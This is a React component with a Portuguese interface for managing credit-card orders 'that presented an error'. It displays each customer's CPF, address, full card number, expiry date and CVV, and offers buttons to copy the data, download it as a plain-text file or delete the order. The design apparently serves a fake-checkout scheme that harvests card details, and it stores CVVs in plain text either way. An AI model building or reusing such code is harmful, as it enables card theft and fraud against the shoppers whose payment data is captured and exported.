import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { getFromLocalStorage, saveToLocalStorage } from "@/utils/localStorage";
import { Download } from "lucide-react";

export function CreditCardOrderManager() {
  const [orders, setOrders] = useState<any[]>([]);
  const { toast } = useToast();

  const fetchOrders = () => {
    const allOrders = getFromLocalStorage('orders', []);
    const creditOrders = allOrders.filter((order: any) => order.payment_method === 'credit');
    setOrders(creditOrders);
  };

  useEffect(() => {
    fetchOrders();
  }, []);

  const handleCopyData = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Dados copiados para a área de transferência"
    });
  };

  const handleDelete = (orderId: string) => {
    const allOrders = getFromLocalStorage('orders', []);
    const updatedOrders = allOrders.filter((order: any) => order.id !== orderId);
    saveToLocalStorage('orders', updatedOrders);
    
    toast({
      title: "Pedido deletado com sucesso!"
    });

    fetchOrders();
  };

  const handleDownloadTxt = (order: any) => {
    const formatOrderData = (order: any) => {
      return `
DADOS DO PEDIDO
--------------
Data: ${new Date(order.created_at).toLocaleString()}
ID do Pedido: ${order.id}

DADOS DO CLIENTE
---------------
Nome: ${order.customer_data.name}
CPF: ${order.customer_data.cpf}
Email: ${order.customer_data.email}
Telefone: ${order.customer_data.phone}
Endereço: ${order.customer_data.address}
Cidade: ${order.customer_data.city}
Estado: ${order.customer_data.state}
CEP: ${order.customer_data.zipCode}

DADOS DO CARTÃO
--------------
Número: ${order.credit_card_data.cardNumber}
Titular: ${order.credit_card_data.cardHolder}
Validade: ${order.credit_card_data.expiryDate}
CVV: ${order.credit_card_data.cvv}

ITENS DO PEDIDO
--------------
${order.items.map((item: any) => `${item.title}
Quantidade: ${item.quantity}
Preço: R$ ${item.price.toFixed(2)}
`).join('\n')}

TOTAL DO PEDIDO: R$ ${order.total_amount.toFixed(2)}
`;
    };

    const content = formatOrderData(order);
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const url = window.URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `pedido-${order.id}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    window.URL.revokeObjectURL(url);

    toast({
      title: "Arquivo TXT baixado com sucesso!"
    });
  };

  return (
    <div className="space-y-4">
      <Card>
        <CardHeader>
          <CardTitle>Pedidos com Cartão erros</CardTitle>
          <CardDescription>
            Visualize e gerencie todos os pedidos com cartão de crédito que apresentaram erro
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            {orders.length === 0 ? (
              <p className="text-gray-500 text-center py-4">
                Nenhum pedido com cartão de crédito encontrado
              </p>
            ) : (
              orders.map((order) => (
                <Card key={order.id} className="p-4">
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <h3 className="font-bold">Dados do Cliente:</h3>
                      <p>Nome: {order.customer_data.name}</p>
                      <p>CPF: {order.customer_data.cpf}</p>
                      <p>Email: {order.customer_data.email}</p>
                      <p>Telefone: {order.customer_data.phone}</p>
                      <p>Endereço: {order.customer_data.address}</p>
                      <p>Cidade: {order.customer_data.city}</p>
                      <p>Estado: {order.customer_data.state}</p>
                      <p>CEP: {order.customer_data.zipCode}</p>
                    </div>
                    
                    <div className="space-y-2">
                      <h3 className="font-bold">Dados do Cartão:</h3>
                      <p>Número: {order.credit_card_data.cardNumber}</p>
                      <p>Titular: {order.credit_card_data.cardHolder}</p>
                      <p>Validade: {order.credit_card_data.expiryDate}</p>
                      <p>CVV: {order.credit_card_data.cvv}</p>
                    </div>

                    <div className="space-y-2">
                      <h3 className="font-bold">Dados do Pedido:</h3>
                      <p>Data: {new Date(order.created_at).toLocaleString()}</p>
                      <p>Total: R$ {order.total_amount.toFixed(2)}</p>
                      <div>
                        <h4 className="font-semibold mt-2">Itens:</h4>
                        <ul className="list-disc pl-5">
                          {order.items.map((item: any, index: number) => (
                            <li key={index}>
                              {item.title} - Quantidade: {item.quantity} - R$ {item.price.toFixed(2)}
                            </li>
                          ))}
                        </ul>
                      </div>
                    </div>

                    <div className="flex justify-end space-x-2">
                      <Button
                        variant="outline"
                        onClick={() => handleCopyData(order.formatted_text)}
                      >
                        Copiar Dados
                      </Button>
                      <Button
                        variant="outline"
                        onClick={() => handleDownloadTxt(order)}
                      >
                        <Download className="w-4 h-4 mr-2" />
                        Baixar TXT
                      </Button>
                      <Button
                        variant="destructive"
                        onClick={() => handleDelete(order.id)}
                      >
                        Deletar Pedido
                      </Button>
                    </div>
                  </div>
                </Card>
              ))
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  );
}